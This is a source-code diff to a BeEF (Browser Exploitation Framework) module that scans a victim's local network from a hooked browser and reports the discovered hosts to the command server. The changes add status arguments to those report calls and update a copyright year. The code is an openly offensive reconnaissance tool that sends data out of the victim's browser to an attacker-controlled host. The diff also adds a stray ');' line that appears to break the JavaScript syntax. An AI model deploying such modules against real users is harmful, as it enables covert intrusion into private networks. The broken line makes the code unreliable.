@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -8,7 +8,7 @@ beef.execute(function() {
 
   if(!beef.browser.isFF() && !beef.browser.isC()){
     beef.debug("[command #<%= @command_id %>] Browser is not supported.");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser");
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
   }
 
   var min_timeout = 500;
@@ -102,13 +102,14 @@ var doScan = function(timeout) {
         beef.debug("Returned large hit rate (" + discovered_hosts.length + " of " + count + ") indicating low network latency. Retrying scan with decreased timeout (" + (timeout - 500) + "ms)");
         doScan(timeout-500);
       } else {
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts);
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts, beef.are.status_error());
       }
     } else if (discovered_hosts.length == 0) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results");
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results", beef.are.status_error());
     } else {
       beef.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
-      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts);
+      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts, beef.are.status_success());
+);
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=scan complete");
     }
   }
